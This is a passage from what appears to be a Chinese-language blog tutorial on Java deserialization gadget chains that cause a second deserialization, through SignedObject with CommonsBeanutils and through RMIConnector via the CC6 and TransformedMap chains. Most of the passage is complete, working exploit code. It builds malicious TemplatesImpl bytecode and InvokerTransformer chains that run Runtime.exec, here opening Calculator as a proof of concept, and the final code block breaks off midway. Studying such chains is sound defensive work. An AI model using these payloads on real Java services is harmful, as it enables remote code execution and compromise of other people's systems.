class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zbz;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cb_SignedObject_twice</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> CtClass <span class="title function_">getEvilClass</span><span class="params">()</span> <span class="keyword">throws</span> CannotCompileException, NotFoundException &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ct</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;</span>;</span><br><span class="line">        ct.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        ct.setName(randomClassName);</span><br><span class="line">        ct.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="keyword">return</span> ct;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> PriorityQueue&lt;Object&gt; <span class="title function_">getPayload</span><span class="params">(Object object, String string)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, beanComparator);</span><br><span class="line">        priorityQueue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        priorityQueue.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        setFieldValue(beanComparator, <span class="string">&quot;property&quot;</span>, string);</span><br><span class="line">        setFieldValue(priorityQueue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;object, <span class="literal">null</span>&#125;);</span><br><span class="line">        <span class="keyword">return</span> priorityQueue;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Unser</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[][] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;getEvilClass().toBytecode()&#125;;</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_bytecodes&quot;</span>, bytes);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;x&quot;</span>);</span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> getPayload(templatesImpl,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(queue, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line">        PriorityQueue&lt;Object&gt; priorityQueue = getPayload(signedObject,<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        Unser(priorityQueue);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="RMIConnector链">RMIConnector链</h2><p>这个RMIConnector类中的findRMIServerJRMP方法存在一个反序列化的方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735308365583-c99f4793-6236-4283-8dda-13732b4d1217.png" alt=""></p><p>这里是会将base64转换成字节码进行反序列化。</p><p>下面就是看看哪里调用了这个findRMIServerJRMP方法，可以找到在其同类下的findRMIServer方法<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735308439632-e71cc486-5adb-4e27-9d75-e9faa534cfe4.png" alt=""></p><p>�看一下源码解释一下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735308486076-54ea5b31-cbc9-4c8f-b6b5-237a630808f5.png" alt=""></p><p>可以看到该方法接受了一个JMXServiceURL类的参数和一个Map，先调用isIiopURL判断directoryURL的协议类型是RMI还是IIOP，这里的判断方法是获取protocol属性进行判断，protocol在构造JMXServiceURL的时候取出service:jmx:后面部分赋值给protocol。如果它是iiop协议，会把java.naming.corba.orb字符和类放入到map中。最终从directoryURL中获取urlPath的内容，取出;的索引位置，如果不存在; ，把end赋值为整个长度，判断path是以/jndi/ /stub/等起始进入不同的方法并把/jndi/ /stub/对应的字符串去掉。此处要触发二次反序列化，需要令findRMIServer进入findRMIServerJRMP，所以要传入的urlPath以/stub/开头并且是rmi协议。</p><p>再去寻找哪里调用了findRMIServer方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735308686794-9596a0bd-6842-4472-b2bb-71dfe3c9a425.png" alt=""></p><p>还是在其同类下的connect方法中会调用到该方法跟进源代码看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735308774976-4d7e7679-8f2e-40c6-ae46-7f80c34da66c.png" alt=""></p><p>可以看到是有这个方法的。这里调用该方法的条件是rmiServer为空，这里的jmxServiceURL可以通过反射进行修改。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://&quot;</span>);</span><br><span class="line">setFieldValue(jmxServiceURL, <span class="string">&quot;urlPath&quot;</span>, <span class="string">&quot;/stub/base64string&quot;</span>);</span><br><span class="line"><span class="type">RMIConnector</span> <span class="variable">rmiConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>现在关键就是要去找哪里调用了connect方法。其实可以通过前面所学的cc链去反射调用该方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rmiconnector_cc6_twice</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldname,Object value)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">org</span>.apache.commons.collections.functors.ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">org</span>.apache.commons.collections.functors.ConstantTransformer(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazymap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">lazyMapClass</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazymap,chainedTransformer);</span><br><span class="line">        <span class="keyword">return</span> map2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">tser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">toser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(tser);</span><br><span class="line">        toser.writeObject(getObject());</span><br><span class="line">        toser.close();</span><br><span class="line"><span class="comment">//序列化内层的payload</span></span><br><span class="line">        String exp= Base64.getEncoder().encodeToString(tser.toByteArray());</span><br><span class="line"></span><br><span class="line">        <span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://&quot;</span>);</span><br><span class="line">        setFieldValue(jmxServiceURL, <span class="string">&quot;urlPath&quot;</span>, <span class="string">&quot;/stub/&quot;</span>+exp);</span><br><span class="line">        <span class="type">RMIConnector</span> <span class="variable">rmiConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL, <span class="literal">null</span>);</span><br><span class="line"><span class="comment">//储存在rmiConnector的rmiConnection中</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;connect&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, rmiConnector);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        lazyMap.remove(rmiConnector);</span><br><span class="line"><span class="comment">//构造了一个lazymap的任意方法构造，调用connect</span></span><br><span class="line">        setFieldValue(lazyMap,<span class="string">&quot;factory&quot;</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里利用cc6链</p><p>再来一条 TransformedMap链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rmiconnector_TransformedMap_twice</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">tser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">toser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(tser);</span><br><span class="line">        toser.writeObject(getObject());</span><br><span class="line">        toser.close();</span><br><span class="line"><span class="comment">//序列化内层的payload</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(tser.toByteArray());</span><br><span class="line"></span><br><span class="line">        <span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://&quot;</span>);</span><br><span class="line">        setFieldValue(jmxServiceURL, <span class="string">&quot;urlPath&quot;</span>, <span class="string">&quot;/stub/&quot;</span> + exp);</span><br><span class="line">        <span class="type">RMIConnector</span> <span class="variable">rmiConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;connect&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(rmiConnector),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;connect&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outmap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        outmap.put(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;text&quot;</span>);</span><br><span class="line"><span class="comment">//Runtime.getRuntime().exec(&quot;&quot;);</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">test</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor construct=test.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> construct.newInstance(Target.class,outmap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        serialize(obj);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    